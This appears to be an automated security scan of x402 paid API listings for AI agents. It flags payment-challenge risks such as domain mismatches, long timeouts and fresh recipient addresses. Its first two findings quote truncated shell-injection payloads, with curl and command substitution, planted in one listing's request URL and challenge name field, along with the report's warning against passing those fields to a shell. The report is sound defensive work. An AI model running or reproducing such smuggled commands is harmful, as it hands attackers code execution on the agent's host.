...
Generated 2026-09-16T12:02:28.158Z. One unpaid request per endpoint to capture the x402 challenge; Pay-Safe /check-payment against the listing. No payments, no signatures.
...
| `endpoint_url_injection` | 1 |
| `challenge_field_injection` | 1 |
| `long_payment_timeout` | 1 |

## Findings

- **DENY endpoint_url_injection** in Market Signal API (sid 39876): The requestUrl contains pipe or backtick near "t-insight;id/{base64,-w0}/{curl,-fsS,-m,". Agents that pass this URL to a shell would run attacker commands.
- **DENY challenge_field_injection** in Market Signal API (sid 39876): The challenge carries a shell payload in accepts[0].extra.name (command substitution or backtick near "I v1.0';api=$(printf '\\151\\144');codec=$"). Never log, template or pass these fields to a tool or shell.
- **WARN long_payment_timeout** in Market Signal API (sid 39876): maxTimeoutSeconds is 600000 (more than 3600).
- **WARN eip712_domain_mismatch** in Market Signal API (sid 39876): extra declares the EIP-712 domain name "Market Signal API v1.0';api=$(pr…" version "1", but the USDT0 contract on xlayer uses name "USD₮0" version "1" (its DOMAIN_SEPARATOR 0xd591d9ba… matches only that pair). A TransferWithAuthorization signed with the declared domain will not verify on-chain.
...
- **WARN fresh_recipient** in Governed market signal (sid 39343): 0xD486faaa06a5630Ab1c61519011584df5F07e7DD has no transaction history and zero balance. Verify it out-of-band; typos and address poisoning look exactly like this.
...
- **WARN eip712_domain_mismatch** in Polymarket LP Scout (sid 33342): extra declares the EIP-712 domain name "USDT" version "1", but the USDT0 contract on xlayer uses name "USD₮0" version "1" (its DOMAIN_SEPARATOR 0xd591d9ba… matches only that pair). A TransferWithAuthorization signed with the declared domain will not verify on-chain.
...
|---|---|---|---|---|
| DENY | Market Signal API (sid 39876) | 0.00001 USDT | 0.00001 USDT0 on eip155:196 | endpoint_url_injection, challenge_field_injection, long_payment_timeout, eip712_domain_mismatch |
| WARN | Market News (sid 40011) | 0.02 USDT | 0.02 USDT0 on eip155:196 | fresh_recipient |
| WARN | Governed market signal (sid 39343) | 0.01 USDT | 0.01 USDT0 on eip155:196 | fresh_recipient |
| WARN | Fusion Strategy Analysis (sid 33556) | 1 USDT | 0.01 USDT0 on eip155:196 | endpoint_domain_suspicious |
| WARN | Polymarket LP Scout (sid 33342) | 0.3 USDT | 0.3 USDT0 on eip155:196 | eip712_domain_mismatch |
...
| unreachable | 项目测凶吉 MCP (sid 35349) | 0.01 USDT | — | fetch failed |
| unreachable | Flow Signal (sid 34588) | 0.02 USDT | — | timeout |
...
| no_payment_challenge | Football Match Live Data (sid 33343) | 0.1 USDT | — |  |
